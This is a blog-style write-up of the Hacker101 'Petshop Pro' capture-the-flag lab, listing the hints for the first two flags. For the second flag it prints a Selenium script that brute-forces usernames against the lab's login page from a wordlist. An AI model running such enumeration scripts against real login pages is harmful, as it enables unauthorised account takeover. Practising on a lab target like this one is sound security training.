# Petshop Pro - Capture The Flag from Hacker101
Created at <time datetime="2021-05-30T00:00:00">2021-5-30</time>


[TOC]

At the start you are given simple website with cats and dogs which you can simply add to your cart. After adding few cats and dogs you can proceed to checkout and after submitting the orders you got server is unavailable.

## First Flag

Isn't beautiful to buy something for free. Well, thats what is the first flag about.

The first flag hints are: 

* Can you buy the cart for free?
* Keep in mind that every input should be tested.

## Second flag

The Second flag was kinda hard for me as I couldn't come up with idea where should I search for the flag. Though the advice didn't make it easier either!

The second flag hints are:

* Search for admin panel page
* Tools will help you to find corrrect user name 
* Tools will help you to find corrrect password

As I said the advice was not so helpful. Firstly I tried to do brute force approach to find the admin page. I took [a-z] permutations of alphabet but there were too many. The limitation is both time and number of queries to

```python
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

driver = webdriver.Firefox()
driver.get("http://35.190.155.168/e3c7a89d01/login")

# Opening file
file1 = open('user_list.txt', 'r')
 
for line in file1:
    user_name = line.strip()
    user = driver.find_elements_by_css_selector('body > form > p:nth-child(1) > input[type=text]')[0]
    user.send_keys(user_name)

    loginbtn = driver.find_elements_by_xpath('/html/body/form/p[3]/input')[0]
    loginbtn.send_keys(Keys.RETURN)

    driver.implicitly_wait(15)

    resp = driver.find_elements_by_css_selector('body > p:nth-child(2) > b:nth-child(1)')[0]
    if resp.text != 'Invalid username':
        print(user_name)
        break

    time.sleep(1)
 
# Closing files
file1.close()
driver.close()
```
